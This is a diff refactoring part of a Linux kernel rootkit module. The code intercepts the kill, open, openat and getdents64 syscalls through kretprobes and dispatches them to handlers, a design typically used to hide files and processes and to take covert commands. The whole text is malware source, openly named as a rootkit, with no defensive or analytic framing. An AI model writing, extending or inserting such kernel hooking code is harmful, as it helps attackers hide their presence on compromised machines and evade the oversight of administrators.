@@ -16,28 +16,36 @@ const int GETDENTS64_SYSCALL = 217;
 
 static int syscall_entry(struct kretprobe_instance *k, struct pt_regs *regs) {
   struct pt_regs *syscall_regs = (struct pt_regs *)regs->di;
-  struct rootkit_cmd *data = (struct rootkit_cmd *)k->data;
-  data->syscall = UNKNOWN;
+  struct rootkit_cmd *cmd = (struct rootkit_cmd *)k->data;
+  cmd->syscall = UNKNOWN;
 
   int syscall_number = *(int *)&syscall_regs->orig_ax;
   if (syscall_number == KILL_SYSCALL) {
+    cmd->syscall = KILL;
+
     int sig = syscall_regs->si;
     int pid = syscall_regs->di;
-    sys_kill_kprobe_enter_handler(sig, pid);
-    data->syscall = KILL;
+    kill_syscall_enter_handler(sig, pid);
+
   } else if (syscall_number == OPEN_AT_SYSCALL) {
+    cmd->syscall = OPEN;
+
     char *__user filename = (char *)syscall_regs->si;
-    sys_open_kprobe_enter_handler(filename, data);
-    data->syscall = OPEN;
+    open_syscall_enter_handler(filename, cmd);
+
   } else if (syscall_number == OPEN_SYSCALL) {
+    cmd->syscall = OPEN;
+
     char *__user filename = (char *)syscall_regs->di;
-    sys_open_kprobe_enter_handler(filename, data);
-    data->syscall = OPEN;
+    open_syscall_enter_handler(filename, cmd);
+
   } else if (syscall_number == GETDENTS64_SYSCALL) {
-    data->data.getdents_data.buf_size = *(unsigned int *)&syscall_regs->dx;
-    data->data.getdents_data.entries =
+    cmd->syscall = GET_DENTS;
+
+    unsigned int buf_size = *(unsigned int *)&syscall_regs->dx;
+    struct linux_dirent64 *__user dirents =
         (struct linux_dirent64 *)syscall_regs->si;
-    data->syscall = GET_DENTS;
+    getdents64_syscall_enter_handler(buf_size, dirents, cmd);
   }
 
   return 0;
@@ -47,10 +55,10 @@ static int syscall_exit(struct kretprobe_instance *k, struct pt_regs *regs) {
   struct rootkit_cmd *data = (struct rootkit_cmd *)k->data;
 
   if (data->syscall == OPEN) {
-    sys_open_kprobe_exit_handler(regs, *data);
+    open_syscall_exit_handler(regs, *data);
   }
   if (data->syscall == GET_DENTS) {
-    sys_getdents64_kprobe_exit_handler(regs, *data);
+    getdents64_syscall_exit_handler(regs, *data);
   }
 
   // free_rootkit_cmd(*data);
